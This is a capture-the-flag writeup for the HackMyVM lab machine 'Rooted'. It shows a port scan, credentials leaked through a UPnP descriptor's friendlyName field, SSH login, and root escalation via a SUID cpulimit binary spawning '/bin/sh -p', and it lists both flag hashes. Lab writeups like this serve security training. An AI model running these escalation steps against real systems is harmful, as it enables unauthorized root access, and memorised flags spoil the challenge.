# Rooted — HackMyVM Writeup

**Difficulty:** Easy  
**OS:** Linux (Debian)  
**Creator:** M0rPH3U5  
**Author:** shalopai

---

## Reconnaissance

```bash
nmap -sV -sC -p- -T4 --min-rate 5000 172.20.10.3
```

Open ports:
- `22/tcp` — OpenSSH 10.0p2 Debian
- `8888/tcp` — Unknown service

> **Note:** The machine requires the network interface to be active, otherwise services won't start.

---

## Enumeration — UPnP on port 8888

Fetching the UPnP descriptor file:

```bash
wget http://172.20.10.3:8888/rootDesc.xml
cat rootDesc.xml
```

Inside the XML, the `friendlyName` field leaks credentials:

```xml
<friendlyName>upnp:nat123!</friendlyName>
```

Credentials extracted: `upnp` / `nat123!`

---

## Initial Access

```bash
ssh upnp@172.20.10.3
# password: nat123!
```

```
upnp@rooted:~$ cat user.txt
70f631df929ad442dee6a7b461e3b628ad7856c6c56c63b416c4396c93ac6c96
```

---

## Privilege Escalation

Checking SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/cpulimit` has the SUID bit set. `cpulimit` can execute a command with the privileges of its owner (root):

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

```
# id
uid=1000(upnp) gid=1000(upnp) euid=0(root)
# cat /root/root.txt
37149263831ce0ea0278305dcb04b680e7b0fcff6133cf2ec8af49b235ea41ba
```

---

## Flags

| Flag | Value |
|---|---|
| User | `70f631df929ad442dee6a7b461e3b628ad7856c6c56c63b416c4396c93ac6c96` |
| Root | `37149263831ce0ea0278305dcb04b680e7b0fcff6133cf2ec8af49b235ea41ba` |

---

## Summary

| Step | Technique |
|---|---|
| Enumeration | UPnP `rootDesc.xml` leaks credentials in `friendlyName` field |
| Initial Access | SSH with credentials `upnp:nat123!` |
| PrivEsc | SUID `cpulimit` — spawn shell with `-f -- /bin/sh -p` |